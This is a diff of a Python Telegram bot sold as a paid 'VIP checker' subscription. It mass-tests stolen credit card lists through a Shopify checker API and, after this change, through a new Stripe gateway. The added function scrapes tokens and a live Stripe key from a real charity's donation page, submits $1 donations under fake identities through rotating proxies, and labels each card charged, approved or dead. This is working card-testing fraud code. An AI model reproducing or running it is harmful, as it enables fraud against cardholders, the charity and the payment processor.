@@ -1,6 +1,6 @@
 # ==============================================================================
-# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (CUSTOM ANIMATED EMOJI IDs, GLOBAL CHARGED FONT, FIXED RAZORPAY & FORCED GIFs)
+# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐒𝐓𝐑𝐈𝐏𝐄 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
+# (CUSTOM ANIMATED EMOJI IDs, GLOBAL CHARGED FONT, ZERO-DELAY GIFS, ASYNC STRIPE API)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -13,6 +13,7 @@ import re
 import io
 import logging
 import sys
+from html import unescape
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -64,7 +65,6 @@ JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
 CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
-RAZORPAY_API_URL = 'https://web-production-6fd9c.up.railway.app/razorpay'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -130,14 +130,13 @@ ANIME_GIFS = [
 ]
 
 PLANS = {
-    "plan1": {"name": sf("Core Access"), "tier": "Core", "duration_days": 7, "price": "$5.00"},
-    "plan2": {"name": sf("Elite Access"), "tier": "Elite", "duration_days": 15, "price": "$10.00"},
-    "plan3": {"name": sf("Root Access"), "tier": "Root", "duration_days": 30, "price": "$15.00"},
-    "plan4": {"name": sf("X-Access"), "tier": "X", "duration_days": 60, "price": "$25.00"},
+    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
+    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
+    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
+    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
 }
 PAID_TIERS = ["Core", "Elite", "Root", "X"]
 
-_GIF_BYTES_CACHE = {}
 _GIF_FILE_IDS = {}
 _system_locks = {}
 
@@ -188,27 +187,7 @@ def get_cc_limit(plan, uid=0):
 def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
-# ====================== STRICT FORCED GIF ENGINE ======================
-async def get_gif_media(url):
-    if url in _GIF_FILE_IDS:
-        return _GIF_FILE_IDS[url]
-    
-    if url not in _GIF_BYTES_CACHE:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, timeout=15) as r:
-                    if r.status == 200:
-                        _GIF_BYTES_CACHE[url] = await r.read()
-        except Exception:
-            pass
-            
-    if url in _GIF_BYTES_CACHE:
-        bio = io.BytesIO(_GIF_BYTES_CACHE[url])
-        bio.name = "animation.gif"
-        return bio
-        
-    return url 
-
+# ====================== ZERO-DELAY GIF ENGINE ======================
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     target = update.callback_query.message if update.callback_query else update.message
@@ -216,30 +195,23 @@ async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, sp
 
     if use_gif or specific_gif:
         url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = await get_gif_media(url)
+        media_to_send = _GIF_FILE_IDS.get(url, url)
         
-        # FIX: المحاولة 5 مرات إجبارياً لإرسال الـ GIF لضمان ظهوره في كل رد وبدون أي تخطي للنص النقي
-        for _ in range(5):
-            try: 
-                msg = await target.reply_animation(
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-                media_to_send = await get_gif_media(url) 
-            except Exception as e:
-                logger.error(f"Forced GIF Engine Retrying: {e}")
-                await asyncio.sleep(1)
-                media_to_send = await get_gif_media(url)
+        try: 
+            msg = await target.reply_animation(
+                animation=media_to_send, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=15,
+                write_timeout=15,
+                connect_timeout=15
+            )
+            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except Exception:
+            pass 
 
     try: 
         return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -259,29 +231,23 @@ async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_g
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     if use_gif or specific_gif:
         url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = await get_gif_media(url)
-        for _ in range(5):
-            try: 
-                msg = await bot.send_animation(
-                    chat_id=chat_id, 
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-                media_to_send = await get_gif_media(url)
-            except Exception as e:
-                logger.error(f"Forced GIF Engine Send Retrying: {e}")
-                await asyncio.sleep(1)
-                media_to_send = await get_gif_media(url)
+        media_to_send = _GIF_FILE_IDS.get(url, url)
+        try: 
+            msg = await bot.send_animation(
+                chat_id=chat_id, 
+                animation=media_to_send, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=15,
+                write_timeout=15,
+                connect_timeout=15
+            )
+            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except Exception:
+            pass
 
     try: 
         return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -370,7 +336,7 @@ async def is_user_joined(uid, bot):
 async def send_welcome_menu(update_or_bot, uid, plan, limit):
     admin_panel = f"\n\n<b>{CE_GEAR} {sf('Admin Panel')}:</b>\n ├ /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ /validate {sf('[key]')} - {sf('Check Key')}\n ├ /users - {sf('System Status')}\n ╰ /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
     
-    t = f"""<b>━━━ {CE_STAR} {sf('SHOPIFY VIP CHECKER')} {CE_STAR} ━━━</b>
+    t = f"""<b>━━━ {CE_STAR} {sf('VIP CHECKER SYSTEM')} {CE_STAR} ━━━</b>
 
 <b>{CE_ROCKET} {sf('Checker Engine')}:</b>
  ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
@@ -422,7 +388,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== CHECKER CORE API (SHOPIFY + RAZORPAY) ======================
+# ====================== CHECKER CORE API (SHOPIFY + STRIPE 1$) ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -433,18 +399,132 @@ async def get_bin_info(bin_code):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
+async def check_stripe_donate_api(card, proxy, session):
+    """Fully Async Engine for Stripe Donate 1$ Gateway"""
+    try:
+        parts = card.split('|')
+        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        yy_short = yy if len(yy) == 2 else yy[-2:]
+        email = f'Ahmed{random.randint(100,999)}@gmail.com'
+        
+        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
+        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
+
+        # 1. Extract Data
+        site_url = 'https://printsofhope.org/donations/donate-now/'
+        base_url = 'https://printsofhope.org'
+        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
+        
+        async with session.get(site_url, headers=headers, proxy=proxy_str, timeout=30) as r:
+            html = await r.text()
+            
+        if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
+            fid = re.search(r'form-id[=]+(\d+)', html)
+            if fid:
+                iframe = f'{base_url}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
+                async with session.get(iframe, headers=headers, proxy=proxy_str, timeout=30) as r2:
+                    html = await r2.text()
+                    
+        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+        fi = re.search(r'name="give-form-id" value="(.*?)"', html)
+        nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
+        pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
+        sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
+        
+        if not all([fp, fi, nc, pk]):
+            return {'status': 'Site Error', 'message': "Token Extraction Error", 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            
+        fp_v, fi_v, nc_v, pk_v = fp.group(1), fi.group(1), nc.group(1), pk.group(1)
+        sa_v = sa.group(1) if sa else ''
+        sa_param = f'&_stripe_account={sa_v}' if sa_v else ''
+
+        # 2. Ajax Call
+        headers_ajax = {'origin': base_url, 'referer': site_url, 'x-requested-with': 'XMLHttpRequest', 'user-agent': "Mozilla/5.0"}
+        data_ajax = {
+            'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
+            'give-form-title': 'Give a Donation', 'give-current-url': site_url,
+            'give-form-url': site_url, 'give-form-minimum': '1.00',
+            'give-form-maximum': '999999.99', 'give-form-hash': nc_v,
+            'give-price-id': 'custom', 'give-amount': '1.00',
+            'give_stripe_payment_method': '', 'payment-mode': 'stripe',
+            'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
+            'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
+            'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
+            'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
+            'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
+        }
+        async with session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=30) as ra:
+            await ra.text()
+
+        # 3. Stripe Payment Method
+        headers_stripe = {
+            'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': "Mozilla/5.0"
+        }
+        stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
+        
+        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_str, timeout=30) as rs:
+            sr = await rs.json()
+            
+        if 'error' in sr:
+            em = sr['error'].get('message', 'Unknown')
+            ec = sr['error'].get('code', 'unknown')
+            ed = sr['error'].get('decline_code', '')
+            status_text = f"Code: {ec} | Decline: {ed} | Message: {em}"
+            if any(k in status_text.lower() for k in ['insufficient', 'not enough']):
+                return {'status': 'Insufficient', 'message': status_text, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            return {'status': 'Dead', 'message': status_text, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+        pm_id = sr['id']
+
+        # 4. Final Processing
+        headers_final = {'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': site_url, 'user-agent': "Mozilla/5.0"}
+        params_final = {'payment-mode': 'stripe', 'form-id': fi_v}
+        data_final = data_ajax.copy()
+        data_final.update({'give_stripe_payment_method': pm_id, 'give_ajax': None})
+        del data_final['give_ajax']
+        
+        async with session.post(site_url, params=params_final, headers=headers_final, data=data_final, proxy=proxy_str, timeout=30) as rf:
+            final_text = await rf.text()
+
+        # Parse Final Response
+        error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', final_text, re.DOTALL)
+        if error_div:
+            clean_error = unescape(re.sub(r'<[^>]+>', '', error_div.group(1))).strip()
+            clean_error = re.sub(r'\s+', ' ', clean_error).replace('Error:', '').strip()
+            
+            if 'insufficient funds' in clean_error.lower():
+                return {'status': 'Insufficient', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            elif 'security code is incorrect' in clean_error.lower() or 'card number is incorrect' in clean_error.lower() or 'approved' in clean_error.lower():
+                return {'status': 'Approved', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            elif any(k in clean_error.lower() for k in ['minimum donation', 'robot', 'captcha']):
+                return {'status': 'Site Error', 'message': clean_error, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            else:
+                return {'status': 'Dead', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+        if 'give-donation-confirmation' in final_text or 'donation-confirmation' in final_text or 'Thank you for your donation' in final_text or ('receipt' in final_text.lower() and 'give_error' not in final_text):
+            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+        notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', final_text, re.DOTALL)
+        if notice_div:
+            cn = unescape(re.sub(r'<[^>]+>', '', notice_div.group(1))).strip()
+            return {'status': 'Dead', 'message': cn, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+        return {'status': 'Dead', 'message': 'Unknown Response', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+    except Exception as e:
+        return {'status': 'Site Error', 'message': f'Connection Error', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+
 async def check_card_api(card, site, proxy, session, gateway_name):
     try:
         if len(card.split('|')) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}
         
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         proxy_param = f"&proxy={proxy_str}" if proxy else ""
-        
-        # FIX: Razorpay dynamic API routing with empty site parameter to avoid 404 errors
-        if gateway_name == "Razorpay":
-            req_url = f"{RAZORPAY_API_URL}?cc={card}&site={site}{proxy_param}"
-        else:
-            req_url = f"{CHECKER_API_URL}?cc={card}&site={site}{proxy_param}"
+        req_url = f"{CHECKER_API_URL}?cc={card}&site={site}{proxy_param}"
         
         async with session.get(req_url, timeout=90) as resp:
             text_data = await resp.text()
@@ -453,27 +533,15 @@ async def check_card_api(card, site, proxy, session, gateway_name):
             except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
             
         rm = str(rj.get('Response', '')).strip()
-        
-        # Razorpay Specific Price Logic
-        if gateway_name == "Razorpay":
-            pr = "1₹"
-        else:
-            pr = rj.get('Price', '-')
-            
+        pr = rj.get('Price', '-')
         gt = rj.get('Gateway', gateway_name)
-        
-        # Handle Razorpay boolean/string status mapping perfectly
-        st_val = rj.get('Status', '')
-        if isinstance(st_val, bool):
-            st = 'true' if st_val else 'false'
-        else:
-            st = str(st_val).strip().lower()
+        st = str(rj.get('Status', '')).strip().lower()
         
         if is_dead_site_error(rm): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
         
         rl = rm.lower()
         
-        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl or 'captured' in rl: 
+        if st == 'true' or 'success' in rl or 'charged' in rl or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: 
             return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
         if 'cloudflare bypass failed' in rl: 
             return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
@@ -481,6 +549,8 @@ async def check_card_api(card, site, proxy, session, gateway_name):
             return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
         if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): 
             return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+        if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']): 
+            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
             
         return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
     except asyncio.TimeoutError: 
@@ -491,32 +561,29 @@ async def check_card_api(card, site, proxy, session, gateway_name):
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
     lr = None; ap = list(proxies) if proxies else []
     for _ in range(max_retries):
-        # FIX: Force empty site string for Razorpay to strictly prevent API 404 server exceptions
-        if gateway_name == "Razorpay":
-            s = ""
+        p = random.choice(ap) if ap else None
+        
+        if gateway_name == "Stripe":
+            r = await check_stripe_donate_api(card, p, session)
+            s = "Stripe" 
         else:
             acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
             if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
             s = random.choice(acs)
+            r = await check_card_api(card, s, p, session, gateway_name)
             
-        p = random.choice(ap) if ap else None
-        r = await check_card_api(card, s, p, session, gateway_name)
         if not r.get('retry'):
-            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
-                if gateway_name != "Razorpay": _SITE_ERRORS_COUNT[s] = 0
+            if gateway_name != "Stripe" and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+                _SITE_ERRORS_COUNT[s] = 0
             return r
         lr = r; await asyncio.sleep(DELAY)
+        
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
 def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
-    
-    # Currency Formatting (₹ for Razorpay)
-    if "₹" in str(price):
-        ps = sf(f"{price}")
-    else:
-        ps = sf(f"${str(price).replace('$', '')}") if price and price != "-" else sf("-")
+    ps = sf(f"${str(price).replace('$', '')}") if price and price != "-" else sf("-")
     
     if status == "Charged": h = f"<b>{CE_STAR} {sf('CHARGED SUCCESSFULLY')}</b>"
     elif status == "Approved": h = f"<b>{CE_ROCKET} {sf('APPROVED CVV')}</b>"
@@ -551,11 +618,7 @@ async def _send_global_hit(status, gateway, message, price, uid, bot, elapsed):
         safe_name = escape_html(sf(user_name))
         plan = await get_user_plan(uid)
         plan_name = plan.title() if plan else "Free"
-        
-        if "₹" in str(price):
-            ps = f" {sf(str(price))}"
-        else:
-            ps = f" {sf(f'${str(price).replace('$', '')}')}" if price and str(price) != "-" else ""
+        ps = f" {sf(f'${str(price).replace('$', '')}')}" if price and str(price) != "-" else ""
         
         if status == "Charged": h = f"<b>{CE_STAR} {sf('CHARGED SUCCESSFULLY')}</b>"
         elif status == "Insufficient": h = f"<b>{CE_FIRE} {sf('INSUFFICIENT FUNDS')}</b>"
@@ -608,11 +671,11 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         if len(cards) > cl: cards = cards[:cl]
         PENDING_FILES[uid] = cards
         
-        # Exact UI Mapping for Gateway selection grid matching sc.jpeg
+        # New Gateway Selection Keyboard mapping
         kb = [
-            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("Razorpay (1₹)"), callback_data="gate:Razorpay", style="success")],
-            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("Stripe (Soon)"), callback_data="gate:soon_Stripe", style="primary")],
-            [InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary"), InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
+            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("Stripe (1$)"), callback_data="gate:Stripe", style="success")],
+            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary")],
+            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
         ]
         await styled_edit(pm, f"<b>{CE_STAR} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_GEAR} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_ROCKET} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_FIRE} {sf('Error')}:</b> {sf(str(e))}")
@@ -759,7 +822,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
             gc.append(c)
         await save_keys(kdb)
-        t = f"<b>{CE_STAR} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n\n"
+        t = f"<b>{CE_STAR} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
         for c in gc: t += f"<code>{sf(c)}</code>\n"
         await styled_reply(update, t, use_gif=True)
 
@@ -787,12 +850,12 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├ <b>{CE_STAR} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
 ├ <b>{sf('Plan')}:</b> <code>{sf(t)}</code>
 ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
-├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>
+├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>
 ╰ <b>{CE_TIME} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
         await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
         
         try:
-            an = f"<b>{CE_STAR} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(rt)}</code>"""
+            an = f"<b>{CE_STAR} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_STAR} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_TIME} {sf('Time')}:</b> <code>{sf(rt)}</code>"
             if ADMIN_ID:
                 for admin in ADMIN_ID:
                     await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
@@ -873,7 +936,7 @@ async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cp = await get_user_plan(uid)
     t = f"<b>{CE_STAR} {sf('VIP Subscription Plans')}</b>\n\n"
     for _, pi in PLANS.items():
-        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
+        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
     kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
     await styled_edit(q.message, t, buttons=kb)
@@ -1012,7 +1075,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             except Exception: break
             try:
                 c_st = time.time()
-                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
+                
+                # Dynamic Routing based on selected Gateway
+                if gate_name == "Stripe":
+                    p = random.choice(proxies) if proxies else None
+                    res = await check_stripe_donate_api(card, p, http_session)
+                else:
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
+                
                 if is_stopped(): break 
                 
                 c_el = time.time() - c_st
@@ -1113,7 +1183,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH ANIMATED EMOJIS & CHARGED FONT!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH ASYNC STRIPE 1$ & CHARGED FONT!")
     
     while True:
         try:
